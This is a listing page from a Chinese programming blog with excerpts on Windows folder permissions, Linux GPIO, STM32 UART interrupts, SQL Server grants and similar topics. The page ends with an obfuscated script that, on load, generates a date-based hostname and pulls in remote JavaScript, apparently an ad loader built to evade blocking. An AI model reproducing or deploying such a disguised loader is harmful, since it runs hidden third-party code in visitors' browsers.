			<a href="/posts/b6cdec31299155cc0201b9964d008302/" rel="bookmark">
			图文：windows7文件夹权限添加_解决目标文件夹访问被拒绝
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		随着windows7操作系统的普及推广，现在已经有很多人的电脑都在只用这个系统了。使用比较多或者细心的人应该会发现在win7的操作系统中，在文件夹下的c:\windows\winsxs的文件和文件夹受到保护无法删除或创建文件夹。现在拿文件夹c:\windows\winsxs\msil_accessibility_b03f5f7f11d50a3a_6.1.7600.16385_none_2232298e4f48d6ba做例子：讲讲如何解决这个问题。 1、在该文件下新建文件，提示没有权限： 2、怎么解决呢？呵呵，现在我们需要手动来添加权限，右键选择属性，你可以看到： 3、选择上图的“高级”，弹出下图 4、选择“所有者”选项卡，你看到的所有者是：TruustedInstaller，这个是系统内部的权限，那么我们来更改: 5、继续继续，操作如下图，选择“其他用户或组”按钮 6、所有者更改后，进行审核 7、审核完毕后，进行权限添加 8、可以看到其中默认的文件： 9、一切完备就需，现在有权限可以新建文件了。 10、对于文件也是同样的操作就可以有权限了。 总结：整过过程其实就是这样：属性→所有者→审核→更改用户权限→完成。此图文大家可以参考并举一反三来处理c:\windows\winsxs下文件夹无法删除等问题。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7ecf457b5b620cccdd5577ab72f9a2b5/" rel="bookmark">
			GPIO内核之旅
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一 概述 Linux内核中gpio是最简单，最常用的资源(和 interrupt ,dma,timer一样)驱动程序，应用程序都能够通过相应的接口使用gpio，
gpio使用0～MAX_INT之间的整数标识，不能使用负数,gpio与硬件体系密切相关的,不过linux有一个框架处理gpio，
能够使用统一的接口来操作gpio.在讲gpio核心(gpiolib.c)之前先来看看gpio是怎么使用的
二 内核中gpio的使用 1 测试gpio端口是否合法 int gpio_is_valid(int number); 有效返回1，无效返回零。
eg: if(!gpio_is_valid(led-&gt;en_gpio)){
printk("led-&gt;en_gpio is not valid!\n");
goto error_free;
}
2 申请某个gpio端口当然在申请之前需要显示的配置该gpio端口的pinmux
int gpio_request(unsigned gpio, const char *label)
3 标记gpio的使用方向包括输入还是输出
/*成功返回零失败返回负的错误值*/ int gpio_direction_input(unsigned gpio); int gpio_direction_output(unsigned gpio, int value); 4 获得gpio引脚的值和设置gpio引脚的值(对于输出)
int gpio_get_value(unsigned gpio);
void gpio_set_value(unsigned gpio, int value); 5 gpio当作中断口使用
int gpio_to_irq(unsigned gpio); 返回的值即中断编号可以传给request_irq()和free_irq()
内核通过调用该函数将gpio端口转换为中断，在用户空间也有类似方法
6 导出gpio端口到用户空间
int gpio_export(unsigned gpio, bool direction_may_change); 内核可以对已经被gpio_request()申请的gpio端口的导出进行明确的管理，
参数direction_may_change表示用户程序是否允许修改gpio的方向，假如可以
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7ecf457b5b620cccdd5577ab72f9a2b5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cda0eff4a5c5ed7a31dddeaf1ec77917/" rel="bookmark">
			android studio 遇到的bug 收集
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题 1
Error:Execution failed for task ':App_ShippingCity:dexRelease'.
&gt; java.util.zip.ZipException: error in opening zip file
on timeout.)
&lt;a href="syncProject"&gt;Re-download dependencies and sync project (requires network)&lt;/a&gt;
&lt;a href="syncProject"&gt;Re-download dependencies and sync project (requires network)&lt;/a&gt;
包重复了，support-v4包重复
有时会遇到 以下错误，也是v4包重复错误
Error:Error converting bytecode to dex:
Cause: com.android.dex.DexException: Multiple dex files define Landroid/support/v4/accessibilityservice/AccessibilityServiceInfoCompat$AccessibilityServiceInfoVersionImpl;
由于你引用的包里面有引用了v4导致的
直接在android studio 中使用 gradlew -q :projectName:dependencies （projectName为你的项目名）查看包应用
如
+--- com.yancy.imageselector:imageselector:1.3.3
| \--- com.android.support:appcompat-v7:22.2.1
| \--- com.android.support:support-v4:22.2.1 -&gt; 23.2.1
| \--- com.android.support:support-annotations:23.2.1
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cda0eff4a5c5ed7a31dddeaf1ec77917/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2ff91e5b007c32755844c1c5f37765dd/" rel="bookmark">
			c&#43;&#43;内存模型
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、栈区:由编译器自动分配和释放，存放函数的参数数值，局部变量的值 其操作方式类似于数据结构中得栈
2、堆区 一般由用户分配和释放，若用户不释放，程序结束时候由OS回收。
它与数据结构中堆是两回事，分配方式类似链表
3、全局区(静态区)static 全局变量和静态变量的存放区域。
初始化的全局变量和静态变量在一块区域 即:data区
未初始化的全局变量和未初始化的静态变量在相邻的另一块区域。即:bbs区
程序结束后由系统释放
4、文字常量区 常量字符串就是放在这里的。程序结束后由系统释放。coment区
5、程序代码区 存放函数体的二进制代码。 code区
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/103bd8525719c17a0f0c6d5711f1cfe4/" rel="bookmark">
			STM32串口中断接收和中断发送
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		STM32串口USART1中断接收和中断发送 先贴出中断函数:
void USART1_IRQHandler(void){if (USART_GetITStatus(USART1, USART_IT_RXNE) != RESET) {USART_ClearITPendingBit(USART1, USART_IT_RXNE);USART1_Buffer[i++]=USART_ReceiveData(USART1); //USART1_Buffesh是一个自己定义的接收数组if(i&gt;3){SendFlag = 1;}}if(USART_GetITStatus(USART1, USART_IT_TXE) != RESET){ //USART_IT_TC这里也可替换if(Open_Send_Flag){ //这是一个发送的标志uart1_sendstring(temp_data);USART_ITConfig(USART1, USART_IT_TXE, DISABLE); //USART_IT_TCOpen_Send_Flag = 0;}else{USART_ITConfig(USART1, USART_IT_TXE, DISABLE); //USART_IT_TC}}} 发送字符串的函数：
void uart1_sendstring(uint8_t* cp){while((*cp)!='\0'){Usart1_Send_isr(*cp);cp++;}} 发送单个字符的函数：
void Usart1_Send_isr(uint8_t ch){USART_SendData(USART1, (uint8_t)ch);while(USART_GetFlagStatus(USART1, USART_FLAG_TXE) == RESET ); //这里做缓冲区是否发送完判断} 然后在中断函数外面发送数据的时候，打开发送中断。USART_ITConfig(USART1, USART_IT_TXE, ENABLE); //USART_IT_TC 之后再贴出两个简单的串口接收和发送的测试小例子：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/103bd8525719c17a0f0c6d5711f1cfe4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d33ddae34d1e9190396ad68f38745057/" rel="bookmark">
			LCIS详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		dp[i][j]表示a[1]~a[i]和b[1]~b[j]并以b[j]结尾的最长公共上升子序列,如果a[i]不等于b[j]时，很明显dp[i][j]的值就等于dp[i-1][j]；如果a[i]等于b[j]时，就在b[1]~b[j]中寻找b[k]使得b[j]&gt;b[k]而且dp[i][k]是最大的。即状态转移方程为：dp[i][j] = dp[i-1][j](a[i] != b[j]),dp[i][j] = max(dp[i][k])+1(1&lt;=k&lt;j &amp;&amp; b[j]&gt;b[k]).
例题：UVA12511
代码：
#include &lt;cstdio&gt; #include &lt;algorithm&gt; #include &lt;cmath&gt; using namespace std; int a[1111],b[1111]; int dp[1111][1111];//dp[i][j]表示a[1]~a[i]和b[1]~b[j]并以b[j]结尾的LCIS int main() { #ifdef CDZSC_June freopen("t.txt","r",stdin); #endif //CDZSC_June int t,n,m; scanf("%d",&amp;t); while(t--) { scanf("%d",&amp;n); for(int i = 1;i&lt;=n; i++) { scanf("%d",&amp;a[i]); dp[i][0] = 0; } scanf("%d",&amp;m); for(int i = 1;i&lt;=m; i++) { scanf("%d",&amp;b[i]); dp[0][i] = 0; } int max1; dp[0][0] = 0; for(int i = 1; i&lt;=n; i++) { max1 = 0;//用来记录小于a[i]的b[j]中最大的dp[i][j] for(int j = 1; j&lt;=m;j++) { if(a[i] !
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d33ddae34d1e9190396ad68f38745057/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6632b71be35f6baa9c0c97808fb641c5/" rel="bookmark">
			关于对sql server读写权限的控制
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		关于对sql server读写权限的控制 今天，有人找我，他想让sqlserver的pekhr用户只能读master库的checkiout表和userinfo表，而且pekhr用户只能更新checkiout表的synced列，其他列不能让pekhr用户更新。由于笔者不十分熟悉sqlserver，对此困惑不已。于是找到了前同事帮忙解决了。 为了下次不忘记，我在这记录一下。 首先，在安全性找到要赋予权限的用户pekhr，右键—&gt;属性，选择public（public表示该用户只能连接到数据库的意思）。 设置pekhr用户(如果该用户没有出现在权限列表里面，请点击”搜索”输入“pekhr”字样进行查询)只能对master库的checkiout表的synced列有update权限，对其他列没有update权限，如下方法： 接下来设置对pekhr用户对master库的checkiout表具有只读权限： 如下：在“选择”处打勾，“选择”就是只读的意思。 最后再设置pekhr用户对master库userinfo表的只读权限（和上面的设置方法一样）： 经过这些步骤的折腾，终于符合了用户的需求。感觉sqlserver好高深。 来自 “ ITPUB博客 ” ，链接：http://blog.itpub.net/28916011/viewspace-2055510/，如需转载，请注明出处，否则将追究法律责任。 转载于:http://blog.itpub.net/28916011/viewspace-2055510/
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/606a6fdaaecc799be221cdbca98e3d86/" rel="bookmark">
			unity3d 尝试 基于地理定位的 增强现实
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		首先说，这个尝试失败，属于死在去医院的路上那种。
基于地理定位的增强现实，AR全息实景，是一种高大上的说法，说直白点就是山寨类似随便走这样的应用。
打开应用，搜索周边信息，然后再把信息叠加在摄像头拍摄到的内容上面。
思路：用手机移动来控制unity中的camrea，将摄像头拍摄到的内容作为背景。获取地理信息，将信息转化成文字添加到unity的世界中。
1、用手机移动控制unity中的camrea。 这段代码中unity的论坛中找到，但是时间很久远，改了下发现能用。
http://forum.unity3d.com/threads/sharing-gyroscope-controlled-camera-on-iphone-4.98828/
using UnityEngine; using System.Collections; public class CameraManager : MonoBehaviour { private bool gyroBool; private Gyroscope gyro; private Quaternion rotFix; public void Start () { Transform currentParent = transform.parent; GameObject camParent = new GameObject ("GyroCamParent"); camParent.transform.position = transform.position; transform.parent = camParent.transform; GameObject camGrandparent = new GameObject ("GyroCamGrandParent"); camGrandparent.transform.position = transform.position; camParent.transform.parent = camGrandparent.transform; camGrandparent.transform.parent = currentParent; gyroBool = SystemInfo.supportsGyroscope; if (gyroBool) { gyro = Input.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/606a6fdaaecc799be221cdbca98e3d86/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/547/">«</a>
	<span class="pagination__item pagination__item--current">548/578</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/549/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>